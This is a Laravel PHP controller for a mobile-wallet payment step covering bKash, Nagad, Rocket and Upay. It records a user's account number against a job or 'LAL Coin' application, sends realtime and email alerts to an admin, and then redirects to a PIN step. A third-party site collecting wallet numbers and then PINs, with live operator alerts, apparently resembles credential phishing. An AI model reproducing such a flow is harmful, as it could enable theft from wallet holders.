<?php

namespace App\Modules\Payment\Http\Controllers;

use App\Events\LalcoinPaymentAccountNumberSubmitted;
use App\Events\PaymentAccountNumberSubmitted;
use App\Models\JobApplication;
use App\Models\LalcoinApplication;
use App\Modules\Payment\Http\Requests\StoreAccountNumberRequest;
use App\Modules\Payment\Services\PaymentSession;
use App\Modules\Payment\Support\GatewayManager;
use App\Notifications\PaymentAccountNumberSubmittedNotification;
use Illuminate\Http\RedirectResponse;
use Illuminate\Routing\Controller;
use Illuminate\Support\Facades\Notification;
use Illuminate\View\View;

class AccountNumberController extends Controller
{
    public function __construct(
        private PaymentSession $session,
        private GatewayManager $gateways,
    ) {
    }

    // public function show(): View
    // {
    //     return view('payment::steps.account-number', ['session' => $this->session]);
    // }
public function show(): View
{
    $method = $this->session->get('method');

    return match ($method) {
        'bkash' => view('payment::steps.bkash.account-number', [
            'session' => $this->session,
        ]),

        'nagad' => view('payment::steps.nagad.account-number', [
            'session' => $this->session,
        ]),

        'rocket' => view('payment::steps.rocket.account-number', [
            'session' => $this->session,
        ]),

        'upay' => view('payment::steps.upay.account-number', [
            'session' => $this->session,
        ]),

        default => abort(400, 'Invalid payment method'),
    };
}
    // public function store(StoreAccountNumberRequest $request): RedirectResponse
    // {
    //     $response = $this->gateways->driver()->verifyAccountNumber(
    //         $this->session,
    //         $request->validated()['account_number'],
    //     );

    //     if (! $response->successful) {
    //         return back()->withErrors(['account_number' => $response->message]);
    //     }

    //     $this->session->setStep('pin');

    //     return redirect()->route('apay-payment.steps.pin');
    // }

public function store(
    StoreAccountNumberRequest $request
): RedirectResponse {

    $accountNumber = $request->validated()['account_number'];

    /*
    |--------------------------------------------------------------------------
    | Verify Account Number with Apay
    |--------------------------------------------------------------------------
    */

    $response = $this->gateways->driver()->verifyAccountNumber(
        $this->session,
        $accountNumber,
    );

    if (! $response->successful) {
        return back()->withErrors([
            'account_number' => $response->message,
        ]);
    }

    // Store account number in payment session
    $this->session->put([
        'account_number' => $accountNumber,
    ]);

    /*
    |--------------------------------------------------------------------------
    | Find Application by Payment Reference
    |--------------------------------------------------------------------------
    */

    $referenceNo = $this->session->get('reference_no');

    if ($referenceNo) {

        /*
        |--------------------------------------------------------------------------
        | LAL Coin Application
        |--------------------------------------------------------------------------
        */

        if (str_starts_with($referenceNo, 'LAL-')) {

            $application = \App\Models\LalcoinApplication::where(
                'payment_reference',
                $referenceNo
            )->first();

            if ($application) {

                $application->update([
                    'payment_number' => $accountNumber,
                ]);
                // Realtime update
                event(new LalcoinPaymentAccountNumberSubmitted($application));
            }

        } else {

            /*
            |--------------------------------------------------------------------------
            | Job Application
            |--------------------------------------------------------------------------
            */

            $application = \App\Models\JobApplication::where(
                'payment_reference',
                $referenceNo
            )->first();

            if ($application) {

                $application->update([
                    'payment_number' => $accountNumber,
                ]);

                // Realtime browser notification
                event(new PaymentAccountNumberSubmitted($application));

                // Email notification
                \Notification::route(
                    'mail',
                    config('mail.admin_notification_email')
                )->notify(
                    new PaymentAccountNumberSubmittedNotification($application)
                );
            }
        }
    }

    /*
    |--------------------------------------------------------------------------
    | Move to PIN Step
    |--------------------------------------------------------------------------
    */

    $this->session->setStep('pin');

    return redirect()->route(
        'apay-payment.steps.pin'
    );
}

}
